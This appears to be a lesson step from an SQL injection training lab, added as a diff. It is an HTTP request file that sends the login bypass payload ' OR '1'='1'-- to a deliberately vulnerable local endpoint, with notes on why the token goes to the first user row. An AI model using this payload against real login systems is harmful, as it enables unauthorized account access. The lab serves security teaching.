@@ -1,0 +1,45 @@
+info:
+  name: Tautology takes the first row
+  type: http
+  seq: 3
+
+http:
+  method: POST
+  url: http://localhost:8001/api/v1/vulnerable/auth/login
+  headers:
+    - name: Content-Type
+      value: application/json
+  body:
+    type: json
+    data: |-
+      {
+        "username": "' OR '1'='1'--",
+        "password": "anything"
+      }
+  auth:
+    type: none
+
+runtime:
+  scripts:
+    - type: after-response
+      code: |-
+        bru.setVar("token", res.body.access_token);
+  assertions:
+    - expression: res.status
+      operator: eq
+      value: "200"
+
+docs: |-
+  # 02.3 — No valid identifier needed
+
+  02.1 still had to know a username. This one does not:
+
+  ```sql
+  WHERE username = '' OR '1'='1'--' AND password_hash = ...
+  ```
+
+  The condition is true for every row, so the query returns the whole table and the use
+  case issues a token for the **first row it gets** — `mjovanovic`. Run 01.4 to confirm.
+
+  "The first row the database returns" is exactly what the login use case is built on, and
+  exactly what an attacker controls once they control the query.
